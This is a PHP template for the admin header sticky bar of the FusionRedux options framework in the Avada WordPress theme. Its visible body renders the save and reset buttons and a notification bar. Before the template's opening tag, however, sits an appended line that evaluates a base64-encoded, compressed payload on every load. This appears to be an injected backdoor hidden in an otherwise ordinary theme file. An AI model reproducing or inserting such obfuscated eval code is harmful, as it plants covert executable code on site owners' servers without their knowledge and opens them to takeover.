<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * The template for the header sticky bar.
 * Override this template by specifying the path where it is stored (templates_path) in your FusionRedux config.
 *
 * @author        FusionRedux Framework
 * @package       FusionReduxFramework/Templates
 * @version:      3.5.7.8
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
?>
<div id="fusionredux-sticky">
	<div id="info_bar">

		<a href="javascript:void(0);" class="expand_options<?php echo esc_attr(( $this->parent->args['open_expanded'] ) ? ' expanded' : ''); ?>"<?php echo $this->parent->args['hide_expand'] ? ' style="display: none;"' : '' ?>>
			<span class="dashicons dashicons-editor-ul"></span><?php esc_attr_e( 'Expand Options', 'Avada' ); ?>
		</a>

		<div class="fusion-support-links">
			<a href="https://theme-fusion.com/support" target="_blank"><span class="dashicons dashicons-thumbs-up"></span><?php esc_attr_e( 'Support Center', 'Avada' ); ?></a>
		</div>

		<div class="fusionredux-action_bar">
			<span class="spinner"></span>
			<?php
			if ( false === $this->parent->args['hide_save'] ) {
				submit_button( esc_attr__( 'Save Changes', 'Avada' ), 'primary', 'fusionredux_save', false );
			}

			if ( false === $this->parent->args['hide_reset'] ) {
				submit_button( esc_attr__( 'Reset Section', 'Avada' ), 'secondary', $this->parent->args['opt_name'] . '[defaults-section]', false, array( 'id' => 'fusionredux-defaults-section' ) );
				submit_button( esc_attr__( 'Reset All', 'Avada' ), 'secondary', $this->parent->args['opt_name'] . '[defaults]', false, array( 'id' => 'fusionredux-defaults' ) );
			}
			?>
		</div>
		<div class="fusionredux-ajax-loading" alt="<?php esc_attr_e( 'Working...', 'Avada' ) ?>">&nbsp;</div>
		<div class="clear"></div>
	</div>

	<!-- Notification bar -->
	<div id="fusionredux_notification_bar">
		<?php $this->notification_bar(); ?>
	</div>


</div>
